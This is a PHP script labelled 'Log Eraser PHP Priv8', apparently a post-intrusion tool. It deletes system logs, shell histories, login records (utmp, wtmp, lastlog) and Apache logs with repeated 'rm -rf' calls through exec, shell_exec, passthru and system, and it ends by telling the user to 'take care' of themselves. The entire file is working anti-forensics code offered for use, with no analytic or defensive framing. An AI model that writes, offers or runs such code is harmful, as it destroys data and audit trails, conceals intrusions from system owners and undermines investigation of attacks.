<?php
@error_reporting(0);
set_time_limit(0);
system("clear");

print "|--=--=--=--=--=--=--=--=--=--=--=--=--=------------|\n";
print "|Log Eraser PHP Priv8                               |\n";
print "|--=--=--=--=--=--=--=--=--=--=--=--=--=------------|\n";

sleep(1);  
print "\n Logs Eraser Started...\!/";
sleep(2);



{

exec("rm -rf /tmp/logs");
exec("rm -rf /root/.ksh_history");
exec("rm -rf /root/.bash_history");
exec("rm -rf /root/.bash_logout");
exec("rm -rf /usr/local/apache/logs");
exec("rm -rf /usr/local/apache/log");
exec("rm -rf /var/apache/logs");
exec("rm -rf /var/apache/log");
exec("rm -rf /var/run/utmp");
exec("rm -rf /var/logs");
exec("rm -rf /var/log");
exec("rm -rf /var/adm");
exec("rm -rf /etc/wtmp");
exec("rm -rf /etc/utmp");
exec("rm -rf $HISTFILE");
exec("rm -rf /var/log/lastlog");
exec("rm -rf /var/log/wtmp");

shell_exec("rm -rf /tmp/logs");
shell_exec("rm -rf /root/.ksh_history");
shell_exec("rm -rf /root/.bash_history");
shell_exec("rm -rf /root/.bash_logout");
shell_exec("rm -rf /usr/local/apache/logs");
shell_exec("rm -rf /usr/local/apache/log");
shell_exec("rm -rf /var/apache/logs");
shell_exec("rm -rf /var/apache/log");
shell_exec("rm -rf /var/run/utmp");
shell_exec("rm -rf /var/logs");
shell_exec("rm -rf /var/log");
shell_exec("rm -rf /var/adm");
shell_exec("rm -rf /etc/wtmp");
shell_exec("rm -rf /etc/utmp");
shell_exec("rm -rf $HISTFILE");
shell_exec("rm -rf /var/log/lastlog");
shell_exec("rm -rf /var/log/wtmp");

passthru("rm -rf /tmp/logs");
passthru("rm -rf /root/.ksh_history");
passthru("rm -rf /root/.bash_history");
passthru("rm -rf /root/.bash_logout");
passthru("rm -rf /usr/local/apache/logs");
passthru("rm -rf /usr/local/apache/log");
passthru("rm -rf /var/apache/logs");
passthru("rm -rf /var/apache/log");
passthru("rm -rf /var/run/utmp");
passthru("rm -rf /var/logs");
passthru("rm -rf /var/log");
passthru("rm -rf /var/adm");
passthru("rm -rf /etc/wtmp");
passthru("rm -rf /etc/utmp");
passthru("rm -rf $HISTFILE");
passthru("rm -rf /var/log/lastlog");
passthru("rm -rf /var/log/wtmp");


system("rm -rf /tmp/logs");
sleep(2);
print "Deleted [+].../tmp/logs \n";
sleep(2);

system("rm -rf /root/.bash_history");
sleep(2);
print "Deleted [+].../root/.bash_history \n";

system("rm -rf /root/.ksh_history");
sleep(2);
print "Deleted [+].../root/.ksh_history \n";

system("rm -rf /root/.bash_logout");
sleep(2);
print "Deleted [+].../root/.bash_logout \n";

system("rm -rf /usr/local/apache/logs");
sleep(2);
print"Deleted [+].../usr/local/apache/logs \n";

system("rm -rf /usr/local/apache/log");
sleep(2);
print"Deleted [+].../usr/local/apache/log \n";

system("rm -rf /var/apache/logs");
sleep(2);
print"Deleted [+].../var/apache/logs \n";

system("rm -rf /var/apache/log");
sleep(2);
print"Deleted [+].../var/apache/log \n";

system("rm -rf /var/run/utmp");
sleep(2);
print"Deleted [+].../var/run/utmp \n";

system("rm -rf /var/logs");
sleep(2);
print"Deleted [+].../var/logs \n";

system("rm -rf /var/log");
sleep(2);
print"Deleted [+].../var/log \n";

system("rm -rf /var/adm");
sleep(2);
print"Deleted [+].../var/adm \n";

system("rm -rf /etc/wtmp");
sleep(2);
print"Deleted [+].../etc/wtmp \n";

system("rm -rf /etc/utmp");
sleep(2);
print"Deleted [+].../etc/utmp \n";

system("rm -rf $HISTFILE");
sleep(2);
print"Deleted [+]...$HISTFILE \n"; 

system("rm -rf /var/log/lastlog");
sleep(2);
print"Deleted [+].../var/log/lastlog \n";

system("rm -rf /var/log/wtmp");
sleep(2);
print"Deleted [+].../var/log/wtmp \n";

sleep(4);

print "Take Care of Your Ass !!! :D \n";

}
?>